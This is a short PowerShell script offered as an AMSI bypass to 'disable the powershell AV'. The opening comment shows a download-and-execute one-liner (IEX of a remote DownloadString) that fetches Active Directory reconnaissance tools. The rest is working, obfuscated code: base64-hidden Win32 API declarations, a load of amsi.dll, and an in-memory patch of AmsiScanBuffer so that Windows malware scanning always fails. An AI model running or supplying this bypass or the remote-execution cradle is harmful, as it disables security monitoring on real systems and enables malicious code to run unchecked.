<#
   AMSI BYPASS (="disable the powershell AV to execute whatever you like without being blocked"). 
   If this script doesn't work anymore, use invoke-obfuscation or use something else on https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/.
   Or google for the latest "AMSI BYPASS" oneliner. 
   
   If you execute this, you can basically execute the most obvious malicious powershell lines without being blocked by the system. 
   Even things like:
         $url = "https://raw.githubusercontent.com/adrecon/ADRecon/master/ADRecon.ps1"
         $url = "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1"
         IEX([Net.Webclient]::new().DownloadString($url))
#>

${_/==\_/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=')))
Add-Type ${_/==\_/\__/===\_/}
${__/=\/==\/\_/=\_/} = [Win32]::LoadLibrary("am" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAC4AZABsAGwA'))))
${___/====\__/=====} = [Win32]::GetProcAddress(${__/=\/==\/\_/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))))
${/==\_/=\/\__/\/\/} = 0
[Win32]::VirtualProtect(${___/====\__/=====}, [uint32]5, 0x40, [ref]${/==\_/=\/\__/\/\/})
${_/\__/=\/\___/==\} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy(${_/\__/=\/\___/==\}, 0, ${___/====\__/=====}, 6)
